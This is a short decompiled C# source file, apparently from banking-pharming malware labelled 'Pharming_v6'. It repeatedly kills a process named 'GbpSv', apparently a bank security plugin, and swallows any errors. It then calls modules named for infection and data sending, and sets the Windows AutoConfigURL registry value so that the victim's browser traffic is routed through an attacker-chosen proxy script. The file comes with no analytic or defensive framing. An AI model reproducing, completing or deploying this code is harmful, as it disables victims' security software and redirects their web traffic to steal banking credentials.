using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Pharming_v6;

[StandardModule]
internal sealed class Module1
{
	public static string osName = "UN";

	public static string temp = Path.GetTempPath();

	public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	[STAThread]
	public static void Main()
	{
		try
		{
			for (int i = 0; i != 1000; i = checked(i + 1))
			{
				Process[] processesByName = Process.GetProcessesByName("GbpSv");
				foreach (Process process in processesByName)
				{
					process.Kill();
					Thread.Sleep(1);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		pharmantiga.pharmantiga();
		pharmnova.pharmnova();
		so.so();
		enviophp.enviophp();
		criatxtinfect.criatxtinfect();
		atproxy1.atproxy1();
	}

	public static object a(string b)
	{
		Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\", writable: true)!.SetValue("AutoConfigURL", b);
		return b;
	}
}
